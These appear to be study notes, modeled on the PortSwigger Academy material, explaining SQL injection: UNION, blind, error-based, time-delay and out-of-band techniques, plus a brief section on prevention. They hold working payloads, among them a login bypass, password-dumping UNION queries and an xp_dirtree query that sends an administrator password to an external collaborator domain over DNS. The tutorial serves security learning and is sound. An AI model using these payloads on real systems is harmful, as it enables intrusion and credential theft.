# Structure Query Language injection

## What is SQL injection (SQLi)?

* SQLi is a web security vulnerability that allows an attacker to interfere with the query that an application makes to it's databases. it generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access.
* In many case an attacker modify or delete this data, causing persistent changes to the application's contents or behavior.

* In some situation, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a DOS attack.
    * Resource [DOS-attack](https://www.securityidiots.com/Web-Pentest/SQL-Injection/ddos-website-with-sqli-siddos.html)
    * Resource [DOS-Wildcard-attack](https://labs.portcullis.co.uk/download/DoS_Attacks_Using_SQL_Wildcards.pdf)

## How to detect SQL injection vulnerability :

* One of the method is to use Web Vulnerability Scanner (Burpsuit web vulnerability scanner).
* SQL injection can be detected manually be using a systematic set of tests against every entry point in the application. This typically involves:
    * Submitting the single quote or double quote `'` or `"` and looking for errors or other anomalies.
    * Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic difference in the resulting application responses.
    * Submitting Boolean conditions such as `OR 1=1` and `OR 1=2`, and looking for differences in the application's responses.
    * Submitting payload designed to trigger time delays when executed within a SQL query, and looking for difference in the time taken to response.
    * Submitting OAST payload designed to trigger an Out of band network interaction when executed within a SQL query, and monitoring for any resulting interactions.

## SQL injection in different parts of the query :

* Most SQL injection arises within the `WHERE` clause of a `SELECT` query. This type of SQL injection is generally well-understood by experienced testers.

* But SQL injection vulnerability can in principle occur at any location within the query, and within different query type. The most common other location Where injection arises are :
    * In `UPDATE` statements, within the updated values or the `WHERE` clause.
    * In `INSERT` statements, within the inserted values.
    * In `SELECT` statements, within the table or column name.
    * In `SELECT` statements, within the `ORDER BY` clause.

## Example of SQLi :

* Consider a sopping application that display products in different categories. when the user click on the Gifts category, their browser requests the URL:

```url
https://insucure-website.com/products?category=Gifts
```
* This causes the application to make a SQL query to retrieve details of the relevant product from the database:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND release = 1
```
* This SQL query ask the databases to return:
    * all details `*`
    * from the product table 
    * where the category is Gifts
    * and released is 1.

* The restriction `released = 1` is being used to hide product that are not released. For unreleased products, presumably `released = 0`.

* The application doesn't implement any defenses against SQLi attacks, so an attacker can construct an attack like :

```url
https://insecure-website.com/products?category=Gifts' --
```
* This result in the SQL query :

```sql
SELECT * FROM product WHERE category = 'Gifts' --' and released = 1
```
* The key thing here is the double-dash sequence `--` is a comment indicator in SQL, and means that the rest of the query is implemented as a comment. This effectively remove the remainder of the query, so it no longer includes `AND released = 1`. This means that all product are displayed, including unreleased products.

* Going further, an attacker can cause the application to display all the products in any categories that they don't know about:

```url
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
* This result in the SQL query:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
* This modified query will return all item where either the category is Gifts, or 1 is equal to 1. Since `1=1` is always true, the query will return all item.


## Subverting application logic :

* Consider an application that lets users log in with a username and password. If a user submits the username `wiener` and password `super_secure_password` the application checks the credentials by performing the following SQL query :
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'super_secure_password' 
```

* If the query return the details of a user, then the login is successful. Otherwise, it is rejected.

* Here, an attacker can log in as any user without a password simply by using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting teh username `administrator ' --` and blank password result in the following query:

```sql
SELECT * FROM users WHERE username = 'administrator' --' password = ''
```
* This query will returns the user whose username is `administrator` and successfully logs the account.

## Retrieving data from other database table :

* In case where the result of a SQL query are returned within the application's responses, an attacker can leverage a SQL injection a SQL injection vulnerability to retrieve data from other tables within the databases. This is done using the `UNION` keyword, which lets you executes an additional `SELECT` query and append the results to the original query.

* For example, if an application executes the following query containing teh user input "Gifts":

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```
* Then an attacker can submit the input :

```sql
' UNION SELECT username, password FROM users--
```

* This will cause the application to return all username and passwords along with the name description of products.

## SQL injection UNION attacks :

* When an application is vulnerable to SQL injection and the result of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database. This result in a SQL injection UNION attack.

* The `UNION` keyword lets you execute one or more additional `SELECT` queries and append the result to the original query. For example :

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
* This SQL query will return a single result set with two columns, containing values from columns `a` and `b` in `table1` and column `c` and `d` in `table2`.

* For a `UNION` query to work, two key requirement must be met:
    * The individual queries must return the same number of columns.
    * The data types in each column must be compatible between the individual queries.

* To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
    * How many columns are being returned from the original query?
    * Which columns returned from the original query are of a suitable data type to hold the results from the injection query?

### Determining the number of columns required in a SQL injection UNION attack

* Whe performing a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

* The `first method` involve injecting a series of `ORDER BY` clause and incrementing the specified column index until an `error occur`. For example assuming the injection point is a quote string within the where clause of the original query, you would submit :

```sql 
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

* This series of payloads modifies the original query to order the results by different columns in the result set.
* The column in an `ORDER BY` clause can be specified by it's index, so you don't need to know the name of any columns. When the specified column index exceeds the number of actual columns in the result set, the database return error such as :

```sql
the ORDER BY position number 3 is out of range of the number of items in the select list.
```
* The application might actually return the database error in it's HTTP response, or it might return a generic error. or simply return no result. Provided you can detect some difference in the application's response, you can infer how many columns are being returned from the query.

* Conclusion : we can identify the no of called `columns` in select statement by getting the exceed `ORDER BY ` number.

* The `Second method` involves submitting a series of `UNION SELECT` payload specifying a difference number of `NULL` values.

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
etc.
```
* If the number of nulls does not match the number of columns, the database return an error such as :

```plain
All queries combined using a UNION, INTERSECT of EXCEPT operation must have an equal number of expression in their target list.
```
* Again, the application might actually return this error message, or might just return a generic error or no results. 
* When the number of nulls matches the number of columns, the databases return an additional row in the result set, containing null values in each column.
* The effect on the resulting HTTP response depends on the application's code. if you are lucky, you will see some additional content within the responses, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. 
* Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective. 

* NOTE :
  * The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the columns count is correct.
  * An Oracle, every `SELECT` query must use the `FORM` keyword and specify a valid table. There is built-in table on oracle called `dual` which can used for this purpose. So the injected queries on Oracle would need to look like:
  ```Sql
  UNION SELECT NULL FROM DUAL-- 
  ``` 
  * The payload described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.
  * Resource : [SQLi Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Finding columns with a useful data type in a SQL injection UNION attack :

* The reason for performing a SQL injection `UNION` attack is to be able to retrieve the result from an injected query. Generally, the interesting data that you want to retrieve will be in single form, so you need to find one or more columns in the original query results whose data type is, or is compatible with string data.

* Having already determined the number of required columns, you can prove each columns to test wether it can hold `string` data by submitting a series of `UNION SELECT` payload that place a string value into each column in turn. For example. if Query returns four columns, you would submit :

```sql
' UNION SELECT 'a', NULL, NULL, NULL-- -
' UNION SELECT NULL, 'a', NULL, NULL-- -
' UNION SELECT NULL, NULL, 'a', NULL-- -
' UNION SELECT NULL, NULL, NULL, 'a'-- -
```
* If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:

```sql
Conversion failed when converting the varchar value 'a' to data type int. 
```

* If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

#### ORDER BY AND UNION SELECT NULL :

* `ORDER BY`
    * IN `SQL` `ORDER BY` used to display the data from ascending or descending order, But when we pass the numbers in `ORDER BY 2` or `ORDER BY 3` or `ORDER BY 4` etc, it simply meaning that format the output in ascending or descending order for column `2` or `3` or `4`.
    * When the limit exceed : mean suppose a table name Customer has only 7 columns & we use the query` SELECT * FROM Customers ORDER BY 7; ` , It will display the output by formatting ascending order to `column 7`, Now What if we pass the query like : `SELECT * FROM Customer ORDER BY 8`, This will result the error, because there is only 7 columns in tables and we are trying the order the `8th` column which doesn't exist.
    * By this method we can guess how many columns are inside the table

* `UNION SELECT NULL, NULL....`
  * Using the `SELECT NULL` will also help us to know how many columns are called in query.
  * By adding the `UNION SELECT NULL,NULL...` we can determine how many columns are there.
  * This query `SELECT CustomerID, City, Address FROM Customers UNION SELECT NULL,NULL,NULL FROM Customers;` will return the fist row has empty value and rest of data will print from second row.
  * Injecting inside the `NULL` we can find the suitable column like `string`.
  * `SELECT CustomerID, City, Address FROM Customers UNION SELECT 'a',NULL,NULL FROM Customers;` This query will print output as the first row first column as 'a' and rest of the first row is null values, then the rest of data will print from the second row.

### Using a SQL injection UNION attack to retrieve interesting data

* When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

* Suppose that :
    * The original query returns two columns both of which can hold string data. 
    * The injection point is a quoted string within `WHERE` clause. 
    * The database contains a table called users with the columns `username` and `password`.
* In this situation, you can retrieve the content of the `users` table by submitting the input:
```sql
' UNION SELECT username, password FROM users-- -
```
* Of course, the crucial information needed to perform this attack is that there is a table called `users` and two columns called `username` and `password`. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provided ways of examining the databases structure to determine what tables and columns it contains.


### Examine the database in SQL injection attack :

* Resource : [Examining database](https://portswigger.net/web-security/sql-injection/examining-the-database)
* Resource : [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

* When exploiting SQL injection vulnerability, it is often necessary to gather some information about the database itself. This includes the type and version of the databases software, and the contents of the databases in terms of which tables and columns it contains.

#### Querying the database type and version :

* Different database provided different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

* The query determining the database version for some popular databases types are as follows:

|Database type | Query |
|--------------|-------|
|Microsoft, MySQL| `SELECT @@version`|
| Oracle | `SELECT * FROM v$version` | 
| PostgreSQL | `SELECT version()` |

* For example you could use a `UNION` attack with the following input:

```sql
' UNION SELECT @@version -- -
```

* This might return output like the following, Confirming that the database is Microsoft SQL server, and the version that is being used:

```plain
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

#### Listing the content of the database :

* Most database type (with the notable exception of Oracle ) have set of views called `information schema` which provide information about the database.

* You can query `information_schema.tables` to list the tables in the databases:

```sql
SELECT * FROM information_schema.tables
```
* This return output like the following:

```plain
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```
* This output indicates that there is three tables, called `Products`, `Users` and `Feedback`.

* You can query `information_schema.columns` to list the columns in individual table:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

```plain
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
* This output will show the columns in the specified table and the data type of each column.

##### Equivalent to information schema on Oracle :

* On Oracle, you can obtain the same information with slightly different queries.
* You can list tables by querying `all_tables`:

```sql
SELECT * FROM all_tables
```

* And you can list columns by querying `all_tab_columns` :

```sql
SELECT * FROM all_tab_columns where table_name = 'USERS'
```

### Retrieving multiple values with a single column :

* In the preceding example, suppose instead that the query only return a single column.

* You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

```sql
' UNION SELECT username || '~' || password FROM users -- -
```
* This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.
* The results from the query will let you read all of the `usernames` and `passwords` for example : 

```plain 
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

> Example : A query for concatenation may look like this :-
```url
https://asdflka2304.web-security-academy.net/filter?category=' UNION SELECT NULL, username || ' ~ ' || password FROM users -- -
```

* Note that different databases use different syntax to perform string concatenation. 
* Resource : [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


## Blind SQL injection Vulnerability :

* Many instances of SQL injection are blind vulnerability. This means that the application does not return the result the result of the SQL query or the details of any database error within its responses. Blind vulnerability can still be exploited to access unauthorized data, but the technique involved are generally more complicated and difficult to perform.
* Depending on the nature of the vulnerability and the database involved, the following technique can be used blind SQL injection vulnerability :
    * You can change the `logic` of the query to `trigger` a `detectable difference` in the application's response depending on the truth of a single condition. This might involve injecting a new `condition` into some `Boolean` logic, or conditional triggering an `error` such as `divide-by-zero`.
    * You can conditionally trigger a` time delay` in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
    * You can trigger an `out-of-band` network interaction, using `OAST` techniques. This technique is extremely powerful and works in situation where the other techniques do not. Often, you can directly exfiltrate data via out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control.

### What is blind SQL injection ?

* Blind SQL injection arises when an application is vulnerable to SQL injection, but it's HTTP responses do not contain the results of the relevant SQL query or the details of any databases errors.

* With blind SQL injection vulnerability, many technique such as `UNION attacks` are not effective because they relay on being able to see the result of the injected query within the application's responses. it is still possible to exploit blind SQL injection to access the unauthorized data, but but the different techniques must be used.

### Exploiting blind SQL injection by triggering conditional responses :

* Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include cookie header like this :

```plain
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

* When a request containing a `TrackingID` cookie is processed, the application determines whether this is a known user using a SQL query like this:
    ```sql
    SELECT TrackingID FROM TrackedUsers WHERE TrackingID = 'u5YD3PapBcR4lN3e7Tj4'
    ```
* This query is vulnerable to SQL injection, but the result from the query are not returned to the user. However, the application does behave differently depending on wether the query return any data. If it return data (because a recognized `TrackingId` was submitted), then a "Welcome back" message is displayed within the page.

* This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by triggering different responses Conditionally, depending on an injected condition. To see how this works, suppose that two requests are send containing the following `TrackingId` cookie value in turn:

```sql
...xyz' AND '1'='1
...xyz' AND '1'='2
```

* The first of these values will cause the query to return results, because `AND '1'='1` condition is `true`, and so the "Welcome back" `message` will be `displayed`. Whereas the second value will cause the query to `not` `return` any `results`, `because` the injected `condition` is `false`, and so "welcome back" `message` will `not` `displayed`. This allows us to determine the `answer` to any `single` injected `condition`, and so extract data on `bit at a time`.

* For example, suppose there is a table called `Users` where the columns `Username` and `Password`, and user called `Administrator`. We can systematically determine the password for this user by sending a series of inputs to test the password on character at a time.

* To do this, we start with the following input:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

* This return the "welcome back" message, `indicating` that the `injected` `condition` is `true`, and so the `first` `character` of `password` is `grater` that `m`.

* Next, we send the following input:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

* This does not return the "welcome back" message, indicating that the injected condition is false, and so the first character of the password is not grater that `t`.

* Eventually, we send the following input, which return the "welcome back" message, thereby confirming that the first character of the password is `s`:
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1,1) = 's
```

* We continue this process to systematically determine the full password for the `Administrator` user.

* Note : The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details , see the [SQL injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

* `SUBSTRING Working Example` :
```sql
    -- create a table
CREATE TABLE students (
  id INTEGER PRIMARY KEY,
  name TEXT NOT NULL,
  gender TEXT NOT NULL
);
-- insert some values
INSERT INTO students VALUES (1, 'Ryan', 'M');
INSERT INTO students VALUES (2, 'Joanna', 'F');
-- fetch some values
SELECT * FROM students;
-- sunstring
SELECT SUBSTRING((Select name from students where id = 1),     3,      1 )='a';
--                                                           ^^^^^    ^^^^
--                                                  let say   1st      2nd
-- The 1st => define the position of input, like in this case : 'a', In name "Ryan", "a" comes at 3rd position.
-- The 2nd -> define the no of input we passed, like we only passed  1 value, i.e 'a'.

-- Substring will give output 0 if it's false, & 1 if it's true.
```

### Error-based SQL injection :

* Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depends largely on the configuration of the database and the type of errors you're able to trigger:
    * You might be able to induce the application to return specific error responses based on the result of a boolean expression. You can exploit this in the same way as the `conditional responses` we looked at in the previous section.
    * You may be able ot trigger error message that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerability into "visible" ones.

#### Exploiting Blind SQL injection by triggering conditional errors :

* In the preceding example, suppose instead that the application cries out the same SQL query, but `not` `behaves` any `differently` depending on whether the `query` return any data. The `preceding` technique will `not` `work`, `because` `injecting` different `boolean` `condition` makes `no` `difference` to the application's `responses`. 
* In this situation, it is often `possible` to `induce` the application to `return` `conditional` `responses` by `triggering` SQL `error` `conditionally`,

* To see how this work, suppose that two requests are sent containing the following `TrackingId` cookie value in turn:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

* These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true. 
    * With the first input, the `CASE` expression evaluates to 'a' which does not cause any error.
    * With second input, it evaluates `1/0` which cause a divide-by-zero error.
    * Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is `true`.
* Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```sql
xyz' ANS (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

* Resource : [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

#### Exploiting Sensitive data via verbose SQL error messages :

* Misconfiguration of the database sometimes results in verbose error message. These can provide information that may be useful to an attacker.

* For example, Consider the following error message, which occur after injecting a single quote into an `id` parameter :
    ```plain
    Unterminated string literal started at position 52 in SQL SELECT * FROM tracking where id = '''. Excepted char
    ```
* This shows the full query that the application constructed using one input. As a result, we can see the context that we're injecting into, that is, a single-quoted string inside a `WHERE` statement.
* This makes it easier to construct a valid query containing a malicious payload. In this case, we can see that commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

* Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a "visible" one.

* One way of achieving this is to use the `CAST()` function, which enable you to convert one data type to another. For example, Consider a query containing the following statement:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```
* Often, the data that you're trying to read is string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following: 

```SQL
ERROR: invalid input syntax for type integer: "Example data"
```

* This type of query may also be useful in cause where you're unable to trigger conditional responses because of a character limit imposed on the query.

### Exploiting blind SQL injection by triggering time delay :

* In some of the preceding examples, we've seen how you can exploit the way application fail to properly handel database errors. But what if the application catches these errors and handles them gracefully? 
* Triggering a database error when the injected SQL quey is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional error will not work.

* In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. 
* Because SQL queries are generally processed synchronously by the application, delaying the execution of a SQL query will also delay the HTTP responses. 
* This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.

* The technique for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10' --
'; IF (1=1) WAITFOR DELAY '0:0:10' --
```
* The first these input will not trigger a delay, because the condition `1=2` is false.
* The second input will trigger a delay of 10 seconds, because the condition `1=1` is true.

* Using this technique, we can retrieve data in the way already described, by systematically testing on character at a time.

```sql
' ; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1)> 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
* Note : There are various ways to trigger time delay within SQL queries, and different techniques apply on different types of database.
    * Resource : [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Exploiting blind SQL injeciton using out-of-band (OAST) techniques :


* Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and another to execute a SQL query using the tracking cookie.
* The query is still vulnerable to SQL injection, however none fo the technique describe so far will work:
* The application's response doesn't depend on whether the query return any data, or on whether a database error occurs, or the time taken to execute the query.
* In This situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-out-of band network interactions to a system that you control. 
* As previously, these can be trigger conditionally, depending on an injection condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.

* A variety of network protocol can be used for this purpose, but typically the most effective is DNS(Domain name service). This is because very many production network allow free egress of DNS queries, because they are essential for the normal operation of production system.

* There are multiple ways to perform :
    * Burp Collaborator
    * [interactsh](https://app.interactsh.com/)

* The technique for triggering a DNS query and highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specific domain:

```sql
' ; exec master..xp_dirtree '//cjjqp6g2vtc00009zmr0gjjm5dcyyyyyb.oast.fun/a' --
```

* This will cause the database to perform lookup for the following lookup domain:

```url
cjjqp6g2vtc00009zmr0gjjm5dcyyyyyb.oast.fun
```


#### Exfiltrate data from OAST vulnerability : 

* Having confirm a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For Example :

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username = 'Administrator' ); exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```


* This input reads the password for the `Administrator` user, append a unique collaborator subdomain, and trigger a DNS lookup. This will result a DNS lookup like the following, allowing you to view the capture password:

```url
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

* Out-of-band (OAST) technique are an extremely powerful way to detect and exploit blind SQL injection, due to highly likelihood of success and the ability to direct exfiltrate data within the out-of-band channel. For this reason, OAST technique exfiltrate data within the out-of-band channel. For this reason, OAST technique are often preferable even in situation where other technique for blind exploitation do work.

* Note : There are Various ways to triggering out-of-band interaction, and different technique apply on different type of databases
  * Resource : [SQL cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### How to prevent blind SQL injection : 

* Although the technique needed to find and exploit blind SQL injection vulnerability are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same regardless of whether the vulnerability is blind or not.

* As with regular SQL injection, blind SQL injection attacks can be prevented though the careful use of parameterized query, which ensure that user input cannot interfere with the structure of the intended SQL query.


### Second-Order SQL Injection :

* First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into a SQL query in an unsafe way.

* In Second-Order SQL injection (also known as Stored SQL injection), the application, takes user input from an HTTP request and stores it for future use.
* This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later when handling a different HTTP request, the application retrieve the stored data and incorporates it into a SQL query in an unsafe way.

* Second-order SQL injection often arises in situation where developer are aware of SQL injection vulnerability, and so safely handel the initial placement of the input into the database.
* When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deem it to be trusted.
* ![](/Server_Side_topics/res/second-order-sql-injection.svg)

### SQL injection in different Contexts :

* It's is important to note that you can perform SQL injection attack using any controllable input that is processed as a SQL query by the application. For example, some website take input in `JSON` or `XML`
Format and user this to query the database.

* These different formats may even provide alternative ways for you to [obfuscate attack](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding) that are otherwise blocked due to `WAFs` and other defense mechanisms. 
* Weak implementation often just look for common SQL injection keywords within escaping character in the prohibited keywords. For Example, the following `XML-based SQL` injection uses an `XML escape sequence` to encode the `S` in `SELECT`.

```xml
<stockcheck>
    <productId>
    123
    </productId>
    <storeId>
    999 &#x53;Elect * FROM information_schema.tables
    </storeId>
    </stockcheck>
```
* This will be decoded server-side before being passed to the SQL interpreter.